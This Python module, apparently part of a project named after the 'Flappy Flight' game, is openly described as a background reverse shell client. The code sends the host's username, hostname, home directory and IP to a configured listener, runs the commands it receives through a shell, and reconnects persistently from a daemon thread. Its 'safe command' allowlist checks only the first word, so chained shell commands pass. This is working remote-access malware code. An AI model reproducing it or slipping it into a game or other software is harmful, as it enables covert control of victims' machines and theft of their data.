"""
Flappy Flight - Client Module
Background reverse shell client that connects to the listener.
Handles system info transmission, command execution (safe commands only),
and auto-reconnection with exponential backoff.
"""

import socket
import subprocess
import platform
import getpass
import os
import sys
import time
import threading
import json

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import (
    LISTENER_HOST, LISTENER_PORT, BUFFER_SIZE,
    RECONNECT_DELAY, MAX_RECONNECT_DELAY, ALLOWED_COMMANDS
)


class FlappyFlightClient:
    """Background client that connects to the Flappy Flight listener."""

    def __init__(self, host=LISTENER_HOST, port=LISTENER_PORT):
        self.host = host
        self.port = port
        self.socket = None
        self.connected = False
        self.running = False
        self._lock = threading.Lock()

    def get_system_info(self):
        """Gather system information to send to the listener."""
        info = {
            "type": "sysinfo",
            "os": platform.system(),
            "os_release": platform.release(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "hostname": platform.node(),
            "username": getpass.getuser(),
            "home_dir": os.path.expanduser("~"),
            "python_version": platform.python_version(),
            "cwd": os.getcwd(),
        }

        # Get IP address
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            info["ip_address"] = s.getsockname()[0]
            s.close()
        except Exception:
            info["ip_address"] = "Unknown"

        return info

    def is_command_allowed(self, command):
        """Check if a command is in the allowed list."""
        cmd_base = command.strip().split()[0] if command.strip() else ""

        # Check exact matches
        if command.strip() in ALLOWED_COMMANDS:
            return True

        # Check if the base command is allowed
        allowed_bases = [cmd.split()[0] for cmd in ALLOWED_COMMANDS]
        if cmd_base in allowed_bases:
            return True

        return False

    def execute_command(self, command):
        """Execute a safe command and return the output."""
        command = command.strip()

        if not command:
            return "[!] Empty command received."

        # Special built-in commands
        if command.lower() == "sysinfo":
            info = self.get_system_info()
            result = "\n╔══════════════════════════════════════╗\n"
            result += "║        System Information            ║\n"
            result += "╠══════════════════════════════════════╣\n"
            for key, value in info.items():
                if key == "type":
                    continue
                result += f"║ {key:>15}: {str(value):<20} ║\n"
            result += "╚══════════════════════════════════════╝"
            return result

        # Check if command is allowed
        if not self.is_command_allowed(command):
            return f"[✗] Command not allowed: '{command}'\n[i] Only safe, predefined commands are permitted."

        # Handle 'cd' internally to maintain state between commands
        if command.startswith("cd "):
            target_dir = command[3:].strip()
            # Handle special paths
            if target_dir == "~":
                target_dir = os.path.expanduser("~")
            elif target_dir == "-":
                target_dir = os.environ.get("OLDPWD", os.getcwd())
            
            try:
                oldpwd = os.getcwd()
                os.chdir(target_dir)
                os.environ["OLDPWD"] = oldpwd
                return f"[i] Changed directory to {os.getcwd()}"
            except FileNotFoundError:
                return f"[✗] Directory not found: {target_dir}"
            except PermissionError:
                return f"[✗] Permission denied: {target_dir}"
            except Exception as e:
                return f"[✗] Failed to change directory: {e}"

        try:
            # Note: For interactive commands like nano/vim, subprocess.run with capture_output=True 
            # will hang or fail since there's no real TTY. We just execute them and capture standard output,
            # but fully interactive terminal apps won't work perfectly over this basic reverse shell.
            # However, for simulation purposes, we allow them to execute.
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=15, # Increased timeout for things like wget/scp
                cwd=os.getcwd(), # Use the actual current working directory
            )
            output = result.stdout
            if result.stderr:
                output += f"\n[stderr]: {result.stderr}"
            return output if output.strip() else "[i] Command executed (no output)."
        except subprocess.TimeoutExpired:
            return "[!] Command timed out (15s limit)."
        except Exception as e:
            return f"[!] Error executing command: {str(e)}"

    def connect(self):
        """Establish connection to the listener."""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            self.socket.connect((self.host, self.port))
            self.socket.settimeout(None)
            self.connected = True

            # Send system info on connect
            sys_info = self.get_system_info()
            self.socket.send(json.dumps(sys_info).encode())

            return True
        except Exception:
            self.connected = False
            if self.socket:
                try:
                    self.socket.close()
                except Exception:
                    pass
            return False

    def communication_loop(self):
        """Main loop: receive commands and send responses."""
        while self.running and self.connected:
            try:
                # Receive command from listener
                data = self.socket.recv(BUFFER_SIZE)
                if not data:
                    self.connected = False
                    break

                command = data.decode().strip()

                if command.lower() == "exit" or command.lower() == "quit":
                    self.connected = False
                    break

                # Execute command and send result
                result = self.execute_command(command)
                self.socket.send(result.encode())

            except socket.timeout:
                continue
            except (ConnectionResetError, BrokenPipeError, OSError):
                self.connected = False
                break

    def run(self):
        """
        Main client loop with auto-reconnection.
        Runs until self.running is set to False.
        """
        self.running = True
        delay = RECONNECT_DELAY

        while self.running:
            if self.connect():
                delay = RECONNECT_DELAY  # Reset delay on successful connection
                self.communication_loop()

            if not self.running:
                break

            # Wait before reconnecting with exponential backoff
            time.sleep(delay)
            delay = min(delay * 2, MAX_RECONNECT_DELAY)

        self.disconnect()

    def disconnect(self):
        """Close the socket connection."""
        self.running = False
        self.connected = False
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass

    def start_background(self):
        """Start the client in a background daemon thread."""
        thread = threading.Thread(target=self.run, daemon=True, name="FlappyFlightClient")
        thread.start()
        return thread


def start_client():
    """Start the client as a standalone process."""
    print("[*] Flappy Flight Client starting...")
    print(f"[*] Connecting to {LISTENER_HOST}:{LISTENER_PORT}...")
    client = FlappyFlightClient()
    try:
        client.run()
    except KeyboardInterrupt:
        print("\n[*] Client shutting down...")
        client.disconnect()


if __name__ == "__main__":
    start_client()
